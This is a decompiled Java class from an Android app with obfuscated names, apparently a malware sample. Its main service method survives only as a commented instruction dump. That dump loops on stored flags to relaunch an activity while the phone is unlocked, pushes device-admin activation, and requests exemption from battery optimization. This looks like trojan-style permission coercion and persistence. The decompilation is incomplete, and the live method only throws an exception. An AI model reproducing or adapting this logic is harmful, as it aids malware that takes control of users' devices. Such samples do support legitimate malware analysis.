package wocwvy.czyxoxmbauu.slsa;

import android.app.IntentService;

public class kldqwysgkfcrmq extends IntentService {

    /* renamed from: a */
    C0039c f427a = new C0039c();

    /* renamed from: b */
    C0033a f428b = new C0033a();

    /* renamed from: c */
    int f429c;

    /* renamed from: d */
    boolean f430d;

    /* renamed from: e */
    int f431e = 0;

    /* renamed from: f */
    C0034b f432f = new C0034b();

    public kldqwysgkfcrmq() {
        super("kldqwysgkfcrmq");
    }

    /* access modifiers changed from: protected */
    /* JADX WARNING: Code restructure failed: missing block: B:12:0x0028, code lost:
        if (android.os.Build.VERSION.SDK_INT <= 23) goto L_0x001c;
     */
    /* JADX WARNING: Removed duplicated region for block: B:20:0x003c A[SYNTHETIC, Splitter:B:20:0x003c] */
    /* JADX WARNING: Removed duplicated region for block: B:26:0x0049  */
    /* JADX WARNING: Removed duplicated region for block: B:34:0x0085  */
    /* JADX WARNING: Removed duplicated region for block: B:59:0x00f9  */
    /* JADX WARNING: Removed duplicated region for block: B:76:0x0152 A[SYNTHETIC, Splitter:B:76:0x0152] */
    /* JADX WARNING: Removed duplicated region for block: B:83:0x019f A[Catch:{ Exception -> 0x0036 }] */
    /* JADX WARNING: Removed duplicated region for block: B:92:0x0036 A[SYNTHETIC] */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public void onHandleIntent(android.content.Intent r14) {
        /*
            r13 = this;
            wocwvy.czyxoxmbauu.slsa.b r14 = r13.f432f
            boolean r14 = r14.mo214a()
            if (r14 == 0) goto L_0x0009
            return
        L_0x0009:
            wocwvy.czyxoxmbauu.slsa.c r14 = r13.f427a
            int r14 = r14.f392s
            r0 = 23
            r1 = 0
            r2 = 1
            if (r14 != 0) goto L_0x0016
        L_0x0013:
            r13.f430d = r1
            goto L_0x002b
        L_0x0016:
            wocwvy.czyxoxmbauu.slsa.c r14 = r13.f427a
            int r14 = r14.f392s
            if (r14 != r2) goto L_0x001f
        L_0x001c:
            r13.f430d = r2
            goto L_0x002b
        L_0x001f:
            wocwvy.czyxoxmbauu.slsa.c r14 = r13.f427a
            int r14 = r14.f392s
            r3 = 2
            if (r14 != r3) goto L_0x002b
            int r14 = android.os.Build.VERSION.SDK_INT
            if (r14 > r0) goto L_0x0013
            goto L_0x001c
        L_0x002b:
            java.lang.String r14 = ""
            wocwvy.czyxoxmbauu.slsa.b r3 = r13.f432f     // Catch:{ Exception -> 0x0036 }
            java.lang.String r4 = "startRequest"
            java.lang.String r3 = r3.mo234e(r13, r4)     // Catch:{ Exception -> 0x0036 }
            r14 = r3
        L_0x0036:
            r3 = 700(0x2bc, float:9.81E-43)
            r13.f429c = r3
            if (r1 != 0) goto L_0x0045
            wocwvy.czyxoxmbauu.slsa.b r3 = r13.f432f     // Catch:{ Exception -> 0x0045 }
            java.lang.String r4 = "startRequest"
            java.lang.String r3 = r3.mo234e(r13, r4)     // Catch:{ Exception -> 0x0045 }
            r14 = r3
        L_0x0045:
            r3 = -1
            r4 = 5
            if (r1 < r4) goto L_0x004a
            r1 = -1
        L_0x004a:
            int r1 = r1 + r2
            java.lang.String r5 = "Access=1"
            boolean r5 = r14.contains(r5)
            java.lang.String r6 = "Perm=1"
            boolean r6 = r14.contains(r6)
            java.lang.String r7 = "device_policy"
            java.lang.Object r7 = r13.getSystemService(r7)
            android.app.admin.DevicePolicyManager r7 = (android.app.admin.DevicePolicyManager) r7
            android.content.ComponentName r8 = new android.content.ComponentName
            java.lang.Class<wocwvy.czyxoxmbauu.slsa.oyqwzkyy.a.a> r9 = wocwvy.czyxoxmbauu.slsa.oyqwzkyy.p002a.C0064a.class
            r8.<init>(r13, r9)
            java.util.concurrent.TimeUnit r9 = java.util.concurrent.TimeUnit.MILLISECONDS     // Catch:{ InterruptedException -> 0x006f }
            int r10 = r13.f429c     // Catch:{ InterruptedException -> 0x006f }
            long r10 = (long) r10     // Catch:{ InterruptedException -> 0x006f }
            r9.sleep(r10)     // Catch:{ InterruptedException -> 0x006f }
            goto L_0x0073
        L_0x006f:
            r9 = move-exception
            r9.printStackTrace()
        L_0x0073:
            java.lang.String r9 = "keyguard"
            java.lang.Object r9 = r13.getSystemService(r9)
            android.app.KeyguardManager r9 = (android.app.KeyguardManager) r9
            boolean r9 = r9.inKeyguardRestrictedInputMode()
            r10 = 1073741824(0x40000000, float:2.0)
            r11 = 268435456(0x10000000, float:2.5243549E-29)
            if (r9 != 0) goto L_0x00f3
            wocwvy.czyxoxmbauu.slsa.b r12 = r13.f432f
            boolean r12 = r12.mo237g(r13)
            if (r12 != 0) goto L_0x0093
            wocwvy.czyxoxmbauu.slsa.c r12 = r13.f427a
            int r12 = r12.f393t
            if (r12 == r2) goto L_0x00ba
        L_0x0093:
            wocwvy.czyxoxmbauu.slsa.b r12 = r13.f432f
            boolean r12 = r12.mo237g(r13)
            if (r12 != 0) goto L_0x00a1
            wocwvy.czyxoxmbauu.slsa.c r12 = r13.f427a
            int r12 = r12.f393t
            if (r12 == r4) goto L_0x00ba
        L_0x00a1:
            wocwvy.czyxoxmbauu.slsa.b r4 = r13.f432f
            boolean r4 = r4.mo237g(r13)
            if (r4 != 0) goto L_0x00b0
            wocwvy.czyxoxmbauu.slsa.c r4 = r13.f427a
            int r4 = r4.f393t
            r12 = 6
            if (r4 == r12) goto L_0x00ba
        L_0x00b0:
            wocwvy.czyxoxmbauu.slsa.b r4 = r13.f432f
            boolean r4 = r4.mo237g(r13)
            if (r4 != 0) goto L_0x00f3
            if (r5 == 0) goto L_0x00f3
        L_0x00ba:
            wocwvy.czyxoxmbauu.slsa.b r4 = r13.f432f
            boolean r4 = r4.mo237g(r13)
            if (r4 != 0) goto L_0x00f3
            android.content.Intent r4 = new android.content.Intent
            java.lang.Class<wocwvy.czyxoxmbauu.slsa.ncec.fymeshs> r5 = wocwvy.czyxoxmbauu.slsa.ncec.fymeshs.class
            r4.<init>(r13, r5)
            r4.addFlags(r11)
            r4.addFlags(r10)
            r13.startActivity(r4)
            r4 = 500(0x1f4, float:7.0E-43)
            r13.f429c = r4
            int r4 = r13.f431e
            if (r4 != 0) goto L_0x00e4
            android.content.Intent r4 = new android.content.Intent
            java.lang.Class<wocwvy.czyxoxmbauu.slsa.clgqtzqdh> r5 = wocwvy.czyxoxmbauu.slsa.clgqtzqdh.class
            r4.<init>(r13, r5)
            r13.startService(r4)
        L_0x00e4:
            int r4 = r13.f431e
            int r4 = r4 + r2
            r13.f431e = r4
            int r4 = r13.f431e
            r5 = 25
            if (r4 <= r5) goto L_0x0036
            r13.f431e = r3
            goto L_0x0036
        L_0x00f3:
            boolean r3 = r7.isAdminActive(r8)
            if (r3 != 0) goto L_0x011b
            boolean r3 = r13.f430d
            if (r3 == 0) goto L_0x011b
            android.content.Intent r3 = new android.content.Intent
            java.lang.Class<wocwvy.czyxoxmbauu.slsa.oyqwzkyy.a.b> r4 = wocwvy.czyxoxmbauu.slsa.oyqwzkyy.p002a.C0065b.class
            r3.<init>(r13, r4)
            java.lang.String r4 = "str"
            java.lang.String r5 = "start"
            r3.putExtra(r4, r5)
            r3.addFlags(r11)
            r4 = 536870912(0x20000000, float:1.0842022E-19)
            r3.addFlags(r4)
            r3.addFlags(r10)
            r13.startActivity(r3)
            goto L_0x0036
        L_0x011b:
            if (r9 != 0) goto L_0x0123
            wocwvy.czyxoxmbauu.slsa.c r3 = r13.f427a
            int r3 = r3.f393t
            if (r3 == r2) goto L_0x0130
        L_0x0123:
            if (r9 != 0) goto L_0x012c
            wocwvy.czyxoxmbauu.slsa.c r3 = r13.f427a
            int r3 = r3.f393t
            r4 = 4
            if (r3 == r4) goto L_0x0130
        L_0x012c:
            if (r9 != 0) goto L_0x0036
            if (r6 == 0) goto L_0x0036
        L_0x0130:
            r3 = 20000(0x4e20, float:2.8026E-41)
            r13.f429c = r3
            int r3 = android.os.Build.VERSION.SDK_INT
            if (r3 < r0) goto L_0x0036
            wocwvy.czyxoxmbauu.slsa.b r3 = r13.f432f
            boolean r3 = r3.mo235e(r13)
            if (r3 != 0) goto L_0x0036
            java.lang.String r3 = "power"
            java.lang.Object r3 = r13.getSystemService(r3)
            android.os.PowerManager r3 = (android.os.PowerManager) r3
            java.lang.String r4 = r13.getPackageName()
            boolean r3 = r3.isIgnoringBatteryOptimizations(r4)
            if (r3 != 0) goto L_0x0185
            android.content.Intent r3 = new android.content.Intent     // Catch:{ Exception -> 0x017c }
            java.lang.String r4 = "android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"
            java.lang.StringBuilder r5 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x017c }
            r5.<init>()     // Catch:{ Exception -> 0x017c }
            java.lang.String r6 = "package:"
            r5.append(r6)     // Catch:{ Exception -> 0x017c }
            java.lang.String r6 = r13.getPackageName()     // Catch:{ Exception -> 0x017c }
            r5.append(r6)     // Catch:{ Exception -> 0x017c }
            java.lang.String r5 = r5.toString()     // Catch:{ Exception -> 0x017c }
            android.net.Uri r5 = android.net.Uri.parse(r5)     // Catch:{ Exception -> 0x017c }
            r3.<init>(r4, r5)     // Catch:{ Exception -> 0x017c }
            r3.addFlags(r11)     // Catch:{ Exception -> 0x017c }
            r3.addFlags(r10)     // Catch:{ Exception -> 0x017c }
            r13.startActivity(r3)     // Catch:{ Exception -> 0x017c }
            goto L_0x0185
        L_0x017c:
            wocwvy.czyxoxmbauu.slsa.b r3 = r13.f432f
            java.lang.String r4 = "ERROR"
            java.lang.String r5 = "Doze Request"
            r3.mo213a(r4, r5)
        L_0x0185:
            wocwvy.czyxoxmbauu.slsa.b r3 = r13.f432f     // Catch:{ Exception -> 0x0036 }
            java.lang.String r4 = "time_work"
            java.lang.String r3 = r3.mo234e(r13, r4)     // Catch:{ Exception -> 0x0036 }
            int r3 = java.lang.Integer.parseInt(r3)     // Catch:{ Exception -> 0x0036 }
            wocwvy.czyxoxmbauu.slsa.b r4 = r13.f432f     // Catch:{ Exception -> 0x0036 }
            java.lang.String r5 = "time_start_permission"
            java.lang.String r4 = r4.mo234e(r13, r5)     // Catch:{ Exception -> 0x0036 }
            int r4 = java.lang.Integer.parseInt(r4)     // Catch:{ Exception -> 0x0036 }
            if (r3 <= r4) goto L_0x0036
            wocwvy.czyxoxmbauu.slsa.b r3 = r13.f432f     // Catch:{ Exception -> 0x0036 }
            r3.mo236f(r13)     // Catch:{ Exception -> 0x0036 }
            goto L_0x0036
        */
        throw new UnsupportedOperationException("Method not decompiled: wocwvy.czyxoxmbauu.slsa.kldqwysgkfcrmq.onHandleIntent(android.content.Intent):void");
    }
}
